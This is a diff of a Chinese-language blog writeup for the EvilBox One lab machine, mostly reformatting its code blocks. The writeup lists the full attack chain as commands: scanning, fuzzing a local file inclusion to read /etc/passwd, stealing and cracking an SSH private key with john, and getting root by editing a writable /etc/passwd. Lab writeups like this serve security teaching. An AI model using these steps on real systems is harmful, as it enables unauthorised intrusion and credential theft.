@@ -15,8 +15,6 @@ sudo nmap -sT -sC -sV -p22,80 10.10.10.18 -oA nmap/Scan 使用 nmap 进行默认
 sudo nmap --script=vuln -p22,80 10.10.10.18 -oA nmap/Script 发现暴露出了很多目录，执行一下完整的目录爆破
 sudo gobuster dir -u http://10.10.10.18 -w /usr/share/dirb/wordlists/common.txt WEB 渗透 80 界面是默认的 Apache2 界面
 robots.txt 界面是一句话，没有价值
-secret 界面打不开，
-gobuster 告诉我们 secret 下面可能还有目录，
 " />
 <meta name="keywords" content=", Hack, Writeup" />
 <meta name="robots" content="noodp" />
@@ -59,9 +57,7 @@ sudo nmap --min-rate 10000 -p- 10.10.10.18 扫描开放端口的基本信息，�
 sudo nmap -sT -sC -sV -p22,80 10.10.10.18 -oA nmap/Scan 使用 nmap 进行默认的漏洞脚本扫描，并将结果保存到本地
 sudo nmap --script=vuln -p22,80 10.10.10.18 -oA nmap/Script 发现暴露出了很多目录，执行一下完整的目录爆破
 sudo gobuster dir -u http://10.10.10.18 -w /usr/share/dirb/wordlists/common.txt WEB 渗透 80 界面是默认的 Apache2 界面
-robots.txt 界面是一句话，没有价值
-secret 界面打不开，
-gobuster 告诉我们 secret 下面可能还有目录，">
+robots.txt 界面是一句话，没有价值">
   <meta itemprop="datePublished" content="2025-05-11T17:29:33+08:00">
   <meta itemprop="dateModified" content="2025-05-11T17:29:33+08:00">
   <meta itemprop="wordCount" content="159">
@@ -77,9 +73,7 @@ sudo nmap --min-rate 10000 -p- 10.10.10.18 扫描开放端口的基本信息，�
 sudo nmap -sT -sC -sV -p22,80 10.10.10.18 -oA nmap/Scan 使用 nmap 进行默认的漏洞脚本扫描，并将结果保存到本地
 sudo nmap --script=vuln -p22,80 10.10.10.18 -oA nmap/Script 发现暴露出了很多目录，执行一下完整的目录爆破
 sudo gobuster dir -u http://10.10.10.18 -w /usr/share/dirb/wordlists/common.txt WEB 渗透 80 界面是默认的 Apache2 界面
-robots.txt 界面是一句话，没有价值
-secret 界面打不开，
-gobuster 告诉我们 secret 下面可能还有目录，">
+robots.txt 界面是一句话，没有价值">
 
 
 
@@ -188,26 +182,26 @@ gobuster 告诉我们 secret 下面可能还有目录，">
 <p>此文章以 kali 地址为 10.10.10.5 为示例</p></blockquote>
 <h1 id="evilbox-one">EvilBox One</h1>
 <h2 id="主机发现">主机发现</h2>
-<pre tabindex="0"><code>
-sudo nmap -sn 10.10.10.0/24
-</code></pre><p>靶机的主机为 10.10.10.18</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>sudo nmap -sn 10.10.10.0/24
+</span></span></code></pre></div><p>靶机的主机为 10.10.10.18</p>
 <h2 id="服务识别">服务识别</h2>
 <p>使用 nmap 对靶机进行扫描，寻找靶机开放的端口以便于进行更进一步的渗透测试</p>
 <p>扫描开放的端口</p>
-<pre tabindex="0"><code>
-sudo nmap --min-rate 10000 -p- 10.10.10.18
-</code></pre><p>扫描开放端口的基本信息，并将结果保存到本地以便于随时观看</p>
-<pre tabindex="0"><code>
-sudo nmap -sT -sC -sV -p22,80 10.10.10.18 -oA nmap/Scan
-</code></pre><p><img src="content/posts/EvilBox%20One%20Writeup/P1.png" alt="P1"></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>sudo nmap --min-rate <span style="color:#ae81ff">10000</span> -p- 10.10.10.18
+</span></span></code></pre></div><p>扫描开放端口的基本信息，并将结果保存到本地以便于随时观看</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>sudo nmap -sT -sC -sV -p22,80 10.10.10.18 -oA nmap/Scan
+</span></span></code></pre></div><p><img src="content/posts/EvilBox%20One%20Writeup/P1.png" alt="P1"></p>
 <p>使用 nmap 进行默认的漏洞脚本扫描，并将结果保存到本地</p>
-<pre tabindex="0"><code>
-sudo nmap --script=vuln -p22,80 10.10.10.18 -oA nmap/Script
-</code></pre><p><img src="P2.png" alt="P2"></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>sudo nmap --script<span style="color:#f92672">=</span>vuln -p22,80 10.10.10.18 -oA nmap/Script
+</span></span></code></pre></div><p><img src="P2.png" alt="P2"></p>
 <p>发现暴露出了很多目录，执行一下完整的目录爆破</p>
-<pre tabindex="0"><code>
-sudo gobuster dir -u http://10.10.10.18 -w /usr/share/dirb/wordlists/common.txt
-</code></pre><p><img src="P3.png" alt="P3"></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>sudo gobuster dir -u http://10.10.10.18 -w /usr/share/dirb/wordlists/common.txt
+</span></span></code></pre></div><p><img src="P3.png" alt="P3"></p>
 <h2 id="web-渗透">WEB 渗透</h2>
 <p>80 界面是默认的 Apache2 界面</p>
 <p><img src="P4.png" alt="P4"></p>
@@ -217,47 +211,47 @@ sudo gobuster dir -u http://10.10.10.18 -w /usr/share/dirb/wordlists/common.txt
 <p>gobuster 告诉我们 secret 下面可能还有目录，</p>
 <p>扫描一下看看</p>
 <p>这次我们指定 http 、php 、txt 作为扫描目标</p>
-<pre tabindex="0"><code>
-sudo gobuster dir -u http://10.10.10.18/secret -w /usr/share/dirb/wordlists/common.txt -x http,php,html  
-</code></pre><p><img src="P6.png" alt="P6"></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>sudo gobuster dir -u http://10.10.10.18/secret -w /usr/share/dirb/wordlists/common.txt -x http,php,html  
+</span></span></code></pre></div><p><img src="P6.png" alt="P6"></p>
 <p>果然有新的发现 evil.php，</p>
 <p>访问一下还是空的，</p>
 <p>fuzz 一下试试</p>
-<pre tabindex="0"><code>
-sudo wfuzz -u &#34;10.10.10.18/secret/evil.php?FUZZ=../../../../../../etc/passwd&#34; -w /usr/share/seclists/Discovery/Web-Content/common.txt --hw 0
-</code></pre><p><img src="P7.png" alt="P7"></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>sudo wfuzz -u <span style="color:#e6db74">&#34;10.10.10.18/secret/evil.php?FUZZ=../../../../../../etc/passwd&#34;</span> -w /usr/share/seclists/Discovery/Web-Content/common.txt --hw <span style="color:#ae81ff">0</span>
+</span></span></code></pre></div><p><img src="P7.png" alt="P7"></p>
 <p>显示有一个 command 可以执行文件包含，</p>
 <p>在网页上试试</p>
-<pre tabindex="0"><code>
-http://10.10.10.18/secret/evil.php?command=../../../../../../etc/passwd
-</code></pre><p><img src="P9.png" alt="P9"></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>http://10.10.10.18/secret/evil.php?command<span style="color:#f92672">=</span>../../../../../../etc/passwd
+</span></span></code></pre></div><p><img src="P9.png" alt="P9"></p>
 <p>发现除了 root ， mowree 也有 bash 环境，那就重点关注一下 mowree 这个用户</p>
 <p><img src="P10.png" alt="P10"></p>
 <p>查看一下私钥，发现能查看，保存到本地</p>
 <p><img src="P11.png" alt="P11"></p>
 <p>用 john 自带的脚本破解一下</p>
-<pre tabindex="0"><code>
-/usr/share/john/ssh2john.py hash/id_rsa &gt; hash_rsa
-</code></pre><p>使用 john 破解</p>
-<pre tabindex="0"><code>
-john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa    
-</code></pre><p><img src="P12.png" alt="P12"></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>/usr/share/john/ssh2john.py hash/id_rsa &gt; hash_rsa
+</span></span></code></pre></div><p>使用 john 破解</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>john --wordlist<span style="color:#f92672">=</span>/usr/share/wordlists/rockyou.txt id_rsa    
+</span></span></code></pre></div><p><img src="P12.png" alt="P12"></p>
 <h2 id="linux-提权">Linux 提权</h2>
 <p>拿到了密码，使用 id_rsa 连接看看</p>
-<pre tabindex="0"><code>
-ssh mowree@10.10.10.18 -i hash/id_rsa
-</code></pre><p>发现 /etc/passwd 有写权限</p>
-<pre tabindex="0"><code>
-ls -liah /etc/passwd
-</code></pre><p><img src="P13.png" alt="P13"></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>ssh mowree@10.10.10.18 -i hash/id_rsa
+</span></span></code></pre></div><p>发现 /etc/passwd 有写权限</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>ls -liah /etc/passwd
+</span></span></code></pre></div><p><img src="P13.png" alt="P13"></p>
 <p>使用 openssl 创建的 hash 修改掉 root 中的 x</p>
-<pre tabindex="0"><code>
-openssl passwd admin
-
-  
-
-vi /etc/passwd
-</code></pre><p><img src="P14.png" alt="P14"></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>openssl passwd admin
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>vi /etc/passwd
+</span></span></code></pre></div><p><img src="P14.png" alt="P14"></p>
 <p><img src="P15.png" alt="P15"></p>
 <h2 id="总结">总结</h2>
 <p>了解 fuzz 、 文件包含 、 公私钥，</p>
